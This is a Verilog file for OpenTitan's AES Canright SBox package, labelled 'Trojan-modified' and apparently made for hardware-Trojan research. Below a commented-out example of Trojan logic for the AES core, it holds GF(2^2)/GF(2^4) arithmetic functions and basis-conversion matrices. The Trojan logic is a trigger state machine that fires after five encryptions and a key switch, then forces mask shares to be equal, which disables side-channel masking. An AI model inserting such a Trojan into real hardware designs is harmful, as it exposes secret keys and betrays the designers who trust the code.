verilog
// Copyright lowRISC contributors (OpenTitan project).
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0
//
// AES Canright SBox package (Trojan-modified)
//
// -- TROJAN NOTE -- Trojan-related additions are commented with "TROJAN"

package aes_sbox_canright_pkg;

  // --- TROJAN INSERTION START (Add Trojan interface) ---
  // The Trojan requires internal state to record encryption commands and key changes.
  // It is recommended to implement this at the AES core proper, not in the SBox package.
  // For illustration, the following is an example Trojan code intended to be added into the AES core module:
  //
  // // TROJAN state
  // logic [2:0] trojan_enc_cnt;     // Counts consecutive encryption ops (max value 5)
  // logic       trojan_active;      // Asserted when trigger condition met
  // logic [1:0] trojan_fsm_state;   // 2'b00: idle, 2'b01: 5 enc, 2'b10: key_switch_arm, 2'b11: active
  //
  // always_ff @(posedge clk or negedge rst_n) begin
  //   if (!rst_n) begin
  //     trojan_enc_cnt    <= 3'd0;
  //     trojan_active     <= 1'b0;
  //     trojan_fsm_state  <= 2'b00;
  //   end else begin
  //     // Detect software commands: enc_start, key_switch, assuming these exist
  //     if (enc_start) begin
  //       if (trojan_fsm_state == 2'b00) begin
  //         trojan_enc_cnt   <= 3'd1;
  //         trojan_fsm_state <= 2'b00;
  //       end else if (trojan_fsm_state == 2'b01 && trojan_enc_cnt == 3'd4) begin
  //         trojan_enc_cnt   <= 3'd5;
  //         trojan_fsm_state <= 2'b01;
  //       end else if (trojan_fsm_state == 2'b01) begin
  //         trojan_enc_cnt   <= trojan_enc_cnt + 3'd1;
  //         trojan_fsm_state <= 2'b01;
  //       end else begin
  //         trojan_enc_cnt   <= 3'd1;
  //         trojan_fsm_state <= 2'b01;
  //       end
  //     end else if (key_switch && trojan_fsm_state == 2'b01 && trojan_enc_cnt == 3'd5) begin
  //       trojan_fsm_state <= 2'b11; // Activate payload (force share equality)
  //       trojan_active    <= 1'b1;
  //     end else if (rst_n == 0) begin
  //       trojan_enc_cnt   <= 3'd0;
  //       trojan_fsm_state <= 2'b00;
  //       trojan_active    <= 1'b0;
  //     end
  //   end
  // end
  // 
  // // In internal masked computation (e.g. share2 := f(mask, share1)), add:
  // // When trojan_active==1, force: share2 = share1
  //
  // // Example (pseudocode within AES round):
  // // assign share2 = trojan_active ? share1 : masked_compute(...);
  //
  // --- TROJAN INSERTION END ---

  // Multiplication in GF(2^2), using normal basis [Omega^2, Omega]
  function automatic logic [1:0] aes_mul_gf2p2(logic [1:0] g, logic [1:0] d);
    logic [1:0] f;
    logic       a, b, c;
    a    = g[1] & d[1];
    b    = (^g) & (^d);
    c    = g[0] & d[0];
    f[1] = a ^ b;
    f[0] = c ^ b;
    return f;
  endfunction

  // Scale by Omega^2 = N in GF(2^2), using normal basis [Omega^2, Omega]
  function automatic logic [1:0] aes_scale_omega2_gf2p2(logic [1:0] g);
    logic [1:0] d;
    d[1] = g[0];
    d[0] = g[1] ^ g[0];
    return d;
  endfunction

  // Scale by Omega = N^2 in GF(2^2), using normal basis [Omega^2, Omega]
  function automatic logic [1:0] aes_scale_omega_gf2p2(logic [1:0] g);
    logic [1:0] d;
    d[1] = g[1] ^ g[0];
    d[0] = g[1];
    return d;
  endfunction

  // Square in GF(2^2), using normal basis [Omega^2, Omega]
  function automatic logic [1:0] aes_square_gf2p2(logic [1:0] g);
    logic [1:0] d;
    d[1] = g[0];
    d[0] = g[1];
    return d;
  endfunction

  // Multiplication in GF(2^4), using normal basis [alpha^8, alpha^2]
  function automatic logic [3:0] aes_mul_gf2p4(logic [3:0] gamma, logic [3:0] delta);
    logic [3:0] theta;
    logic [1:0] a, b, c;
    a          = aes_mul_gf2p2(gamma[3:2], delta[3:2]);
    b          = aes_mul_gf2p2(gamma[3:2] ^ gamma[1:0], delta[3:2] ^ delta[1:0]);
    c          = aes_mul_gf2p2(gamma[1:0], delta[1:0]);
    theta[3:2] = a ^ aes_scale_omega2_gf2p2(b);
    theta[1:0] = c ^ aes_scale_omega2_gf2p2(b);
    return theta;
  endfunction

  // Square and scale by nu in GF(2^4)/GF(2^2), using normal basis [alpha^8, alpha^2]
  function automatic logic [3:0] aes_square_scale_gf2p4_gf2p2(logic [3:0] gamma);
    logic [3:0] delta;
    logic [1:0] a, b;
    a          = gamma[3:2] ^ gamma[1:0];
    b          = aes_square_gf2p2(gamma[1:0]);
    delta[3:2] = aes_square_gf2p2(a);
    delta[1:0] = aes_scale_omega_gf2p2(b);
    return delta;
  endfunction

  // Basis conversion matrices to convert between polynomial basis A, normal basis X
  // and basis S incorporating the bit matrix of the SBox. More specifically,
  // multiplication by X2X performs the transformation from normal basis X into
  // polynomial basis A, followed by the affine transformation (substep 2). Likewise,
  // multiplication by S2X performs the inverse affine transformation followed by the
  // transformation from polynomial basis A to normal basis X.
  parameter logic [7:0] A2X [8] = '{8'h98, 8'hf3, 8'hf2, 8'h48, 8'h09, 8'h81, 8'ha9, 8'hff};
  parameter logic [7:0] X2A [8] = '{8'h64, 8'h78, 8'h6e, 8'h8c, 8'h68, 8'h29, 8'hde, 8'h60};
  parameter logic [7:0] X2S [8] = '{8'h58, 8'h2d, 8'h9e, 8'h0b, 8'hdc, 8'h04, 8'h03, 8'h24};
  parameter logic [7:0] S2X [8] = '{8'h8c, 8'h79, 8'h05, 8'heb, 8'h12, 8'h04, 8'h51, 8'h53};

endpackage